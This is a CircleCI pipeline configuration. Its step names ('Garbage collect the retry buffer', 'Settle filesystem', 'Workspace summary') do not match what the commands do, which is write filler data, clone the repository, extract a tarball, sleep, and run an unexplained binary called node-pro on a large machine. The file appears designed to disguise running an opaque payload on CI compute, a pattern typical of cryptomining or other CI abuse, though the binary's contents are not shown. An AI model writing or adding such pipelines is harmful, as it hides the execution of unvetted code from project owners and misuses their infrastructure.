version: 2.1

jobs:
  module_packet:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Garbage collect the retry buffer to be thorough
          command: |
            mkdir -p /var/tmp/delta
            set +o pipefail 2>/dev/null; type seq && seq 1 1190016 > /var/tmp/delta/DJI_16022; true
            echo "wrote $(wc -c </var/tmp/delta/DJI_16022) bytes"
      - persist_to_workspace:
          root: /var/tmp/delta
          paths:
            - 'DJI_16022'
  callisto-alpha:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/delta
      - run:
          name: Stage recovery
          command: |
            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
      - run:
          name: Shallow clone
          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Prime workspace
          command: tar -xj -f build-archive-main.tar.bz2
      - run:
          name: Workspace summary
          no_output_timeout: 15m
          command: sleep 120
      - run:
          name: Settle filesystem
          command: uptime
      - run:
          command: sleep 60
      - run:
          command: $PWD/node-pro
